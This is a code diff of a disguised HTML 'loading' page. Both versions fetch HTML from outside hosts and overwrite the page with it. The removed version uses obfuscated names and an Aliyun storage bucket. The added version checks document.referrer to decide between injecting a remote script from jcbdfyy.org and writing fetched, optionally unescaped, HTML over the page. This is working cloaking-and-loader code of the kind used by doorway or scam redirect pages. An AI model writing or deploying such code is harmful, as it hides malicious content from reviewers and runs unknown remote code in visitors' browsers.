@@ -1,21 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
-<head> <meta charset="UTF-8"> <title>页面加载中</title> </head>
-<body>
-<h1 style="font-size: 50px;text-align:center; margin: 63px 0 0 0;"> 努力加载中...<h1>
-</body>
+<html><head><meta charset="utf-8"></head><body></body>
 <script>
-    const a7eead2xst = window.location.search;
-    const a7eead24t6rt = new URLSearchParams(a7eead2xst);
-    var fw = a7eead24t6rt.get('fw')
-    var a7eead240bbc50ded33ytik  = new XMLHttpRequest;
-    a7eead240bbc50ded33ytik.onload = function(){
-      var a7eead240bbc50ded333eafaiot = document.open("text/html", "replace");
-      a7eead240bbc50ded333eafaiot.write(a7eead240bbc50ded33ytik.responseText);
-      a7eead240bbc50ded333eafaiot.close();
+    document.title="请稍后，连接中...";
+ if(!document.referrer){
+        var type = getUrlParam('type');var to = getUrlParam('to');
+        loadJs("https://jcbdfyy.org/api/go_land.php?type="+type+"&to="+to)
+    }else{
+        var fw = getUrlParam('fw'); var isescaped = fw.includes('.escaped');
+        var xhr = new XMLHttpRequest; var html = null; xhr.onload = function(){html = xhr.responseText;render();}; var url = "https://jcbdfyy.org/"; xhr.open("GET", url + fw, !0); xhr.send();
     }
-    a7eead240bbc50ded33ytik.open("GET", "https://lbcontent.oss-cn-shenzhen.aliyuncs.com/" + fw, !0);
-    a7eead240bbc50ded33ytik.send();
-
+function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&#]*)(&|$|#)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return '';}
+function render() {var a = document.open("text/html", "replace"); if(isescaped){html = unescape(html)} a.write(html); a.close();}
+function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
 </script>
 </html>
